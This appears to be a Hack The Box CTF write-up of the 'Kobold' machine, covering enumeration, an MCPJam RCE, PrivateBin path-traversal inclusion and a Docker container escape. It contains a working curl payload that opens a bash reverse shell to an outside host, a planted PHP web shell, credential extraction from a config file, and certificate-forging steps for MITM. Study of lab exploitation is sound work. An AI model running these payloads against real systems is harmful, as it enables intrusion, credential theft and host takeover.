# Kobold - CTF - HACK THE BOX.

# Enumeration

``` bash
-sC #Scanning using default scripts (but some of them are cotegorized as intrusive!!)
-sV #Prints versions of listening services
-p- #Scanning all possible ports (from 1 to 65535)
```

``` bash
~ nmap -sC -sV -p- <ip>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-22 07:19 +0000
Nmap scan report for kobold.htb (<ip>)
Host is up (0.050s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Kobold Operations Suite
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
3552/tcp open  http     Golang net/http server
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Length: 2081
|     Content-Type: text/html; charset=utf-8
|     Expires: 0
|     Pragma: no-cache
|     Date: Fri, 22 May 2026 07:20:35 GMT
|     <!doctype html>
```

Scanning gives us **4 opened (services) ports** and one interesting detail - **wildcard**:
#### Listening Services (Ports)

| Port Number / Service  | Description                                                                                                                                                                                                                                                                                                                                                                                                                 |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `22` - SSH             | **Secure Shell** - protocol, used for **remote accessing and managing computers or servers through secure connection** over an unsecured network, using passwords, passphrases and SSH keys: <br><br>**Private key** (secret), which stores on the (your) local computer, used for signing<br><br>Public key stores on the target server or machine (usually in a file called `~/.ssh/authorized_keys`), used for verifying |
| `80` - http /nginx 1.2 | HTTP web-server, which redirects us to the port 443                                                                                                                                                                                                                                                                                                                                                                         |
| `443` - https  /nginx  | HTTPS web-server (encypted)                                                                                                                                                                                                                                                                                                                                                                                                 |
| `3552` - ???           | Not identified (Arcane - Docker Management)                                                                                                                                                                                                                                                                                                                                                                                 |

Port 80 - **dummy web-page**. 
Zero interactive, zero backend - just html landing page - nothing interesting. 
![](<../assets/img/Pasted image 20260522080808.png>)

Port 3552 - **Arcane -  Docker Management** 
login form (dashboard) and link to the project's github page.
![](<../assets/img/Pasted image 20260522080920.png>)
**What is Docker?** According to the official documentation (wiki): `Docker is a set of products that uses operating system-level virtualization to deliver software in packages called containers. Docker automates the deployment of applications within lightweight containers, enabling them to run consistently across different computing environments.`

**Or in other words:** Docker is an application that allows users to run services, applications, and processes inside isolated environments called containers without worrying about affecting or corrupting the host system.

**Arcane Docker Management** - service for creating, managing and interacting with containers using user-friendly GUI.

---
#### Wildcard sign in the URL - Subdomain Enumeration
` DNS:*.kobold.htb` - wildcard sign directly means - there is one or more subdomains, which we need to enumerate.

Firstly, using `curl` command we need to check default size of an error-response: 
```bash
curl -k https://kobold.htb -H "Host: subdomaincheck.kobold.htb" | wc -c
~ 154
```

``` bash
-k #skip certification check
-H #allows us to send the custom header
```

After, using `ffuf` we start subdomain enumeration
```
ffuf -w ~/Documents/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u https://<ip> -H "Host: FUZZ.kobold.htb" -k -fs 154 -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://<ip>
 :: Wordlist         : FUZZ: /home/personanongratta/Documents/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.kobold.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 54ms]
bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 57ms]
```

``` bash
-w #specifying of the wordlist 
-u #our target url
-H + "Host: FUZZ.kobold.htb" #specifyng the header and the place we want fo FUZZ inside it 
-k #skipping certification check
-fs #reponse size filter
-ac #automatically callibrates filtering options (additional filtering)
```

Our subdomain scanning  have identified 2 values:

| Name            | Description                                                                                                                         |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| mcp.our-url.com | MCPJam -tool using for management AI agents, debugging and testing AI tools                                                         |
| bin.our-url.com | PrivateBin - opensource online pastebin where the server has zero knowledge of pasted data, using for secure exchanging of any data |

**MCPJam (Version: v1.4.2)** - AI management platform. 
![](<../assets/img/Pasted image 20260521182719.png>)

![](<../assets/img/Pasted image 20260521182805.png>)


**PrivateBin (Version 2.0.2)** - Pastebin platform.
![](<../assets/img/Pasted image 20260522084430.png>)

---
# Foothold 
### MCPJam: [CVE-2026-23744](https://github.com/InzegoSec/CVE-2026-23744)
At first glance identified subdomain's web-page we have already discovered didn't give us any interesting information, but if we dive deeper in the tech. part we can find  **[CVE-2026-23744](https://github.com/InzegoSec/CVE-2026-23744),** which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to **RCE (Remote Code Execution)** via Reverse Shell.

##### How does it works?
By default, MCPJam (up to version 1.4.3) suffers from `Missing Authentication for Critical Function`, meaning that a critical endpoint lacks any authentication mechanism. In addition, the MCPJam Inspector listens and is accessible on all network interfaces (0.0.0.0) instead of only localhost (127.0.0.1), attacker can send custom HTTP request addressed to the endpoint `/api/mcp/conenct`, manipulating with `command` and `args` fields.

MCPJam Inspector - local web-server based on Node.js, which sets up http server, allowing interacting with them via UI or API.

`/api/mcp/conenct` - REST-endpoint - intercepts request and connects it to the MCP server configuration (using POST HTTP Method).

```json
POST http://localhost:6274/api/mcp/connect
{
  "command": "node",
  "args": ["./my-mcp-server.js"],
  "env": {}
}
```
MCPJam takes command from `command + args `and launches it like child process via `child_process.spawn()` (basic function for testing). Main problem: THERE IS NO VERIFICATION.

#### On the attacker's machine:
We launching netcat listener for intercepting connection
```bash
nc -nlvp 4444
```

**Reverse Shell payload** would look like this:
``` bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.144/4444 0>&1"],"env":{}},"serverId":"pwn"}'
```

``` bash
-d #allows us to insert custom data
```

`bash -c 'bash -i >& /dev/tcp/10.10.14.144/4444 0>&1'`:
`bash -c ` - `bash` initiates new shell with executing command inside `(-c)`
`bash -i` - provides fully interactive bash-session.
`/dev/tcp/10.10.14.144/4444 0>&1'` - bash can establish tcp connections as file descriptors (id, instead of file), `0>&1` - stdin (0), stdout(1) and stderr (&) - all input and result will be sent to the source

We successfully gained reverse shell!
``` bash
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```
As we can see we are in system as a Ben, who is in the `operator` group, but before system enumeration, we need to upgrade our shell.

---
### Terminal Session Upgrading 
For comfortable using with all default features we can upgrade our terminal, using python and built-in commands and modules:
``` bash & python
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo; fg      
export TERM=xterm
```

``` python
'import pty; pty.spawn("/bin/bash")' #imports pseudo-terminal module and spawn inside it bash environment
CTRL + Z #puts shell's session in the background
stty raw -echo; fg #make session raw (for directly sending input to the shell, without any rendering); disables local rendering of input characters; puts process in the foreground
```

---
### Basic System Enumeration
Now, let's check what users also exist, what processes are running on the system and which files are available for our group:

``` bash
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
ben:x:1001:1001::/home/ben:/bin/bash
alice:x:1002:1002::/home/alice:/bin/bash
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```
As we can see we have alice, ben and root (+ www-data).

Also, alice is in the docker group, while ben isn't.
``` bash
cat /etc/group | grep docker# docker:x:111:alice
```

After scanning for files that ben's `operator` group can interact with, we found PrivateBin files, including its certificates, salts, configuration, and **data**:
``` bash
ben@kobold:/home$ find / -group "operator" 2>/dev/null   
find / -group "operator" 2>/dev/null
/privatebin-data
/privatebin-data/certs
/privatebin-data/certs/key.pem
/privatebin-data/certs/cert.pem
/privatebin-data/data
/privatebin-data/data/purge_limiter.php
/privatebin-data/data/bd
/privatebin-data/data/bd/b5
/privatebin-data/data/.htaccess
/privatebin-data/data/e3
/privatebin-data/data/traffic_limiter.php
/privatebin-data/data/salt.php
```

If we took a deeper look, we can see, that `data` directory is world-writable - everybody (including root) can read, execute and write (alter) its files.
``` bash
ben@kobold:/privatebin-data$ ls -la
total 20
drwxrwx---  5 root operator 4096 Mar 15 21:23 .
drwxr-xr-x 22 root root     4096 Mar 16 20:57 ..
drwxrwx---  2 root operator 4096 Mar 15 21:23 certs
drwxr-x---  2 root       82 4096 Mar 15 21:23 cfg
drwxrwxrwx  5 root operator 4096 Mar 15 21:23 data
```

But before we start exploiting it, we need to check running processes to make sure that nothing was missed:
``` bash
ben@kobold:/privatebin-data$ ss -tlnp
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                         
    4096       127.0.0.1:8080      0.0.0.0:*                                   
    4096   127.0.0.53%lo:53        0.0.0.0:*                                   
    4096       127.0.0.1:39385      0.0.0.0:*                                   
    511          0.0.0.0:80         0.0.0.0:*                                   
    4096         0.0.0.0:22         0.0.0.0:*                                   
    511        127.0.0.1:6274       0.0.0.0:*    users:(("node",pid=1707,fd=33))
    511          0.0.0.0:443        0.0.0.0:*                                   
    4096      127.0.0.54:53         0.0.0.0:*                                   
    4096               *:3552             *:* 
```

| Process's Number | Port   | Service          |
| ---------------- | ------ | ---------------- |
| 127.0.0.1        | 8080   | PrivateBin       |
| 127.0.0.1        | 6274   | MCPJam Inspector |
| 0.0.0.0          | 80/443 | Nginx Web-server |
| *                | 3552   | Arcane           |
I’m really suggesting that everyone check all suspicious process information to build a complete picture of what is currently running on the system:
``` bash
ps aux | grep 8080
root  /usr/bin/docker-proxy ... -host-port 8080 -container-ip 172.17.0.2
```
After this scan we are sure - **privatebin is running in the docker, with root privileges.** This is a key to root.

---
# Privilege Escalation
#### PrivateBin: [CVE-2025-64714 (GHSA-g2j9-g8r5-rg82)](https://nvd.nist.gov/vuln/detail/CVE-2025-64714)
According to our research, **Privatebin Version 2.0.2** is vulnerable to Local File Inclusion. This type of attack occurs when an attacker is able to include in the website a payload or malicious file that can be executed in future. This can be achieved using `../` sings, which in system's language means - `one step back from you actual position (directory)`

If `templateselection` (in the configuration) is enabled in the configuration, the server trusts the `template` cookie and includes the referenced PHP file.

Let's set up a web-shell, for gaining terminal inside docker's container - our main purpose is to read `cfg/conf.php` file, which can contain very useful information. (Just a reminder that this is just as important because the **container** is running as **root**).

According to [CVE's description ](https://nvd.nist.gov/vuln/detail/CVE-2025-64714)we will use simple, php web-shell:
``` bash
ben@kobold:/privatebin-data cat > /privatebin-data/data/pwn.php << 'EOF'<?php system($_GET['cmd']); ?>EOF
```
#### What is the web-shell?
Web-shell is a file that will be parsed (executing via URL) and executed as code by webserver (user: `www-data` ). They are designed to give their users a means of executing arbitrary commands on the web-server. They are placed on the web-server without the permission of the owners of the site.

Typically, they work using `system()` or `exec()` functions. This is not by itself a vulnerability, but **if an attacker have access to them, or can control passed parameters** ( like with `templateselection`) it becomes a severe-vulnerability, which can lead to: Remote Code Execution (**RCE); File Upload; File Download; Database compromising, etc..**

[CVE-2025-64714 (GHSA-g2j9-g8r5-rg82)](https://nvd.nist.gov/vuln/detail/CVE-2025-64714) tells us about vulnerable cookie parameter - `template`, which we can exploit (since `templateselection` is enabled ) using curl, triggering our payload.
``` bash
~ curl -k https://bin.kobold.htb/ \
  -b "template=../data/pwn" \ 
  -G --data-urlencode "cmd=whoami"
nobody
```
In our case, PrivateBin with enabled `templateselection` trust the values `tempalte` and directly inserts it in the `include()` function - without any validation - it allows us to transmit to the server path to our new-created PHP payload, instead of legitimate template.

``` bash
-b #specifies a cookie parameter
-G --data-urlencode #get method + adding data with url encoding
```
We got response - `nobody`! It's our session's id, which means we are in the system.

Now, let's execute something more interesting - let's compromise privatebin's config.
``` bash
curl -k https://bin.kobold.htb/ \
  -b "template=../data/pwn" \
  -G --data-urlencode "cmd=cat /srv/cfg/conf.php"
```

After reviewing server's answer, we can find some credential! - `Z3r0P4ss` and `ComplexP@sswordAdmin1928`, all of them are `privatebin`'s user, but but we need to try all of them in different combinations, hoping for credential reuse across other services.
``` bash
 ;[model_options]
 ;dsn = "pgsql:host=localhost;dbname=privatebin"
2;tbl = "privatebin_"     ; table prefix
5;usr = "privatebin"
8;pwd = "Z3r0P4ss"
8;opt[12] = true    ; PDO::ATTR_PERSISTENT
8

 [model_options]
 dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
 tbl = "privatebin_"    ; table prefix
 usr = "privatebin"
0pwd = "ComplexP@sswordAdmin1928"
```

- ssh  alice, root, ben
- su alice / su root
- Arcane - admin, alice, ben, privatebin, root

Sadly, all of the above combinations didn't give us any access, but we already have one untouched service - Arcane Dashboard. Let's check it's [manual](https://getarcane.app/docs/setup/installation) or [GitHub](https://github.com/getarcaneapp/arcane/discussions/1103) for finding any basic credentials.

Default username: Arcane
Default password: was changed

However we can use our leaked one.

We are in the system as an administrator! Now, we can create the privileged (root) container with next parameters: 

![](<../assets/img/Pasted image 20260521182356.png>)
`name` - any container name
`user` - 0 (root user's id)
`image` - `privatebin/nginx-fpm-alpine:2.0.2`
`command` - /bin/bash


![](<../assets/img/Pasted image 20260521182411.png>)
`Volume mounts:` /:/hostfs - we mount the whole system's directory (`/`) to our container (docker uses /hostfs file for writing which volumes are mounted)

![](<../assets/img/Pasted image 20260521182420.png>)
`privileged mode`: true

![](<../assets/img/Pasted image 20260521182331.png>)
We are free to explore the entire system because we mounted all its directories, and can finally search for the root flag.

---
# Lateral Movement
Now, we are totally free - we can generate ssh-keys for future connections, set up backdoor or rootkit or compromise all user's data.

---
# Kill-Chain

![](<../assets/img/killchain_kobold.png>)
MITRE ATT&CK Kill Chain - **T1046** `(Network service discovery)` $\rightarrow$ **T1190** (`Exploit public-facing app)` $\rightarrow$ **T1059.004** `(Unix shell) `$\rightarrow$ **T1082 + T1613** `(System + container discovery)` $\rightarrow$ **T1505.003** `(Web shell)` $\rightarrow$ **T1552.001** `(Credentials in Files)` $\rightarrow$ **T1078** `(Valid accounts)` $\rightarrow$ **T1610 + T1611** `(Deploy container + escape to host)`

---
# Additional attack vector 
As was mentioned above, our `operator` group are available privatebin's files, which expose for us one of the real-life attack vectors. MITM attack is not useful in the Kobold's (CTF) case, but is widely used in our days.

``` bash
ben@kobold:/home$ find / -group "operator" 2>/dev/null   
find / -group "operator" 2>/dev/null
/privatebin-data
/privatebin-data/certs
/privatebin-data/certs/key.pem
/privatebin-data/certs/cert.pem
/privatebin-data/data
/privatebin-data/data/purge_limiter.php
/privatebin-data/data/bd
/privatebin-data/data/bd/b5
/privatebin-data/data/.htaccess
/privatebin-data/data/e3
/privatebin-data/data/traffic_limiter.php
/privatebin-data/data/salt.php
```

### MITM (Man-In-The-Middle Attack) 
Type of the attacks when an **attacker** is between server and host, **intercepting all incoming and outgoing traffic.**    Now, let's take a look: we have privatebin's **certification** (`cert.pem`) and **private** key (`key.pem`) both are used for establishing secure connection via HTTPS, previously all the time we have been used `-k` flag in curl and ffuf for skipping **certification's validation check,** because it was **outdated**. Nothing prevents us from creating our own, new and fresh certification and signing it with private key:

```bash
openssl req -new -key key.pem -out request.csr #basic information (name, country.. etc)
openssl x509 -req -in request.csr -signkey key.pem -out cert.pem -days 365 #creating new, self-signed certificate
```

```bash
openssl #linux built-in tool for working with keys, certs, TLS/SSL, encryption and signatures 
req -new #subcomand for working with Certificate Signing Request (CSR) or crecating certificates (x509)
-key #our private key
-out request.csr #command's result

x509 #self-signed certificate command
-req -in request.csr #provided information about cert's owner
-signkey #private key
-out #command's result
-days 365 #certificate validation time
```

Now, we just need to replace old certificate with out new-created one (to make sure, that certificate will work, we can check nginx config): 

``` bash
ssl_certificate     /path/to/cert.pem;
ssl_certificate_key /path/to/key.pem;
```


